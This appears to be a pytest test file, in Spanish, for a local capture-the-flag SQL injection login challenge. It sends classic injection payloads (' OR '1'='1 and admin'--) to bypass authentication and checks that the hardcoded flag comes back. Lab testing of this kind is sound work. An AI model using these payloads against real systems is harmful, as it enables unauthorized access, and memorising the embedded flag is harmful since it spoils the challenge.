"""
Tests del reto SQLi Login.
Requiere el servicio Docker corriendo en localhost:8083.
"""
import requests, time, pytest

BASE = "http://localhost:8083"


def _service_up(timeout=3):
    try:
        return requests.get(f"{BASE}/health", timeout=timeout).status_code == 200
    except Exception:
        return False


skip_if_down = pytest.mark.skipif(
    not _service_up(), reason="Servicio sqli_login no disponible (arranca Docker)"
)


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        if _service_up(1):
            return
        time.sleep(0.2)
    pytest.skip("Servicio no disponible tras esperar")


def login(usuario, password):
    return requests.post(f"{BASE}/api/login",
                         json={"usuario": usuario, "password": password})


@skip_if_down
def test_normal_login_fails_without_creds():
    wait_up()
    r = login("pepe", "malpassword")
    assert r.status_code == 401


@skip_if_down
def test_normal_login_works_with_correct_creds():
    r = login("juan", "password123")
    assert r.status_code == 200
    assert r.json()["rol"] == "user"


@skip_if_down
def test_sqli_bypass_or_1_eq_1():
    """Payload clásico en el campo contraseña: ' OR '1'='1"""
    # Inyectar en la contraseña coloca el OR al final, sin interferencia del AND
    # Query resultante: WHERE usuario='x' AND contrasena='' OR '1'='1'
    r = login("x", "' OR '1'='1")
    assert r.status_code == 200
    data = r.json()
    assert "secreto" in data


@skip_if_down
def test_sqli_admin_comment_bypass():
    """Payload: admin'-- (comenta el AND contrasena=...)"""
    r = login("admin'--", "")
    assert r.status_code == 200
    data = r.json()
    assert data.get("rol") == "admin"
    secreto = data.get("secreto", "")
    assert secreto.startswith("CTF{")
    assert secreto.endswith("}")


@skip_if_down
def test_flag_via_admin_sqli():
    """Test de integración: obtener la flag vía SQL injection como admin."""
    r = login("admin'-- ", "")
    assert r.status_code == 200
    flag = r.json().get("secreto", "")
    assert flag == "CTF{sqli_las_comillas_mandan}"
